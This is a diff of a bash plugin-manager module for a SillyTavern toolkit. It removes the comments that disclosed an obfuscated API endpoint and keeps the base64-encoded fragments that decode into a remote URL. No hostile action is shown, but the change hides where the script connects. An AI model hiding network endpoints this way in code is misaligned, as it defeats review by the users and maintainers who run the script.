@@ -1,15 +1,11 @@
 #!/bin/bash
 # SillyTavern Module: Plugin Manager
-# 负责管理酒馆的第三方扩展插件
 
 [ -z "$TAVX_DIR" ] && source "$HOME/.tav_x/core/env.sh"
 source "$TAVX_DIR/core/ui.sh"
 source "$TAVX_DIR/core/utils.sh"
 
-# Obfuscated API endpoint
-# Part 1: https://tav-x-api
 _h="aHR0cHM6Ly90YXYteC1hcGk="
-# Part 2: .future404.qzz.io
 _b="LmZ1dHVyZTQwNC5xenouaW8="
 API_URL=$(echo "${_h}${_b}" | base64 -d 2>/dev/null)
 
